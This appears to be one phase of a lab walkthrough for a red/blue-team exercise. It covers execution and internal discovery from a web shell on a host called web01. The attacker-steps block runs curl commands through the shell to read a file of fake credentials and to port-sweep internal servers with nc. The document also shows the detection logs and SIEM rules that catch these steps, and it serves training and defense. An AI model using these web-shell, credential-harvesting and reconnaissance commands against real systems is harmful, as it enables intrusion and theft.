# Phase 3 — Execution and internal discovery on web01

> Reference scenario — authorized lab use only. See [`../DISCLAIMER.md`](../DISCLAIMER.md).

## Video concept

Execution (kill chain step 3) and post-exploitation discovery: reading a
provisioning note with fake credentials, then mapping which east-west paths
the firewall actually allows — the video's "blocked path" seen from inside.

## Objective

From the web shell on `web01`, harvest the fake database credentials from
`/srv/notes/deployment.txt` and probe the server segment to learn exactly
what the DMZ→servers allowlist permits — before using it.

## Attacker steps

```bash
# Drive the web shell from the attacker container (cookie from phase 2):
docker exec -it attacker bash

# 1) The provisioning note - the simulated weak point with fake DB creds:
curl -s -b /tmp/ck.txt -X POST \
     --data-urlencode "cmd=cat /srv/notes/deployment.txt" \
     "http://172.31.100.1/console?token=DEV-2026"
#   -> svc_web / Web#Svc2026!

# 2) Where can we go? Probe the Domain Controller on the video's port set:
curl -s -b /tmp/ck.txt -X POST --data-urlencode \
  "cmd=for p in 22 53 88 135 389 445 464 636 3389; do (nc -zv -w2 10.10.30.10 \$p 2>&1 || true) | grep -E 'succeeded|timed'; done" \
  "http://172.31.100.1/console?token=DEV-2026"
#   expected: 88 and 464 succeed (FW-08 allows Kerberos); everything else
#   times out - dropped by FW-10/FW-11, NOT 'refused' (the firewall drops).

# 3) And the file server, where the money is:
curl -s -b /tmp/ck.txt -X POST \
     --data-urlencode "cmd=nc -zv -w2 10.10.30.11 445 2>&1 | grep -E 'succeeded|timed'" \
     "http://172.31.100.1/console?token=DEV-2026"
#   expected: succeeds - FW-07 allows DMZ -> filesrv SMB. This is the path
#   phase 4 walks through.

# 4) Internal network position (for the blue team's benefit as much as ours):
curl -s -b /tmp/ck.txt -X POST \
     --data-urlencode "cmd=ip route; ip -brief addr show eth0" \
     "http://172.31.100.1/console?token=DEV-2026"
#   expected: default via 10.10.10.1 (all traffic traverses the firewall)
```

## What the blue team sees

| Signal | Where | Sample line | Detection |
|---|---|---|---|
| Every shell command | web01 app log | `... INFO CONSOLE-EXEC ip=172.31.100.3 user=admin cmd=cat /srv/notes/deployment.txt` | SIEM rule 100911 |
| Blocked internal probes | fw log | `FW-LATERAL-DENY: IN=eth1 OUT=eth3 SRC=10.10.10.5 DST=10.10.30.10 ... PROTO=TCP SPT=41022 DPT=389` | SIEM rule 100902 |
| Allowed internal probes | fw counters | FW-07/FW-08 `counter packets 4 bytes 240 accept` | `docker exec fw nft -a list chain inet filter forward` |

```bash
# Blue-team commands:
docker exec web01 grep 'CONSOLE-EXEC' /var/log/app/access.log | tail
docker logs fw 2>&1 | grep 'FW-LATERAL-DENY' | tail
docker exec fw nft -a list chain inet filter forward | grep -E 'FW-0[78]'
```

The denied probes are the interesting ones: a web server sweeping the
internal segment is an IoA on its own, and the deny log names source,
destination, and port for the runbook.

## IOC vs IoA box

- **IOC (artifact):** the credential string `svc_web / Web#Svc2026!` from the
  provisioning note — once known leaked, the account itself becomes the
  indicator to watch for logons from the DMZ.
- **IoA (behavior):** an internal port sweep *originating from a DMZ web
  host* — no legitimate web tier performs east-west discovery.

## Kill chain position

Step 3 — execution, extended with internal reconnaissance (the discovery TTP
that sets up lateral movement).
